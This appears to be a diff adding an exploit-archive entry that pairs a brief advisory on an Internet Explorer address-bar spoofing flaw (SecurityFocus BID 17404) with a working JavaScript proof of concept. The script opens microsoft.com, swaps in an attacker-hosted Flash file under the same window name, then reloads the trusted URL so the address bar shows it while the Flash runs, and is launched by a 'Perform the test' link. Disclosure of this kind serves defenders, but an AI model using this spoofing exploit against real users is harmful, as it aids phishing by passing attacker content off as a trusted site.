@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/17404/info
+
+Internet Explorer is prone to address-bar spoofing.
+
+An attacker can exploit this issue to display the URI of a trusted and known site in the address bar, while running an attacker-supplied Macromedia Flash application. This may aid in phishing-style attacks and possibly allow access to properties of the trusted domain.
+
+<script language="javascript">
+function pause(ms)
+{
+date = new Date();
+var curDate = null;
+
+do { var curDate = new Date(); }
+while(curDate-date < ms);
+}
+
+function spoof () {
+win = window.open('http://www.microsoft.com/','new')
+pause (2000)
+win = window.open('http://www.example.com/swfs/index.swf','new')
+pause (2000)
+win = window.open('http://www.microsoft.com/','new')
+
+}
+</script>
+<a href="javascript: spoof()">Perform the test</a>
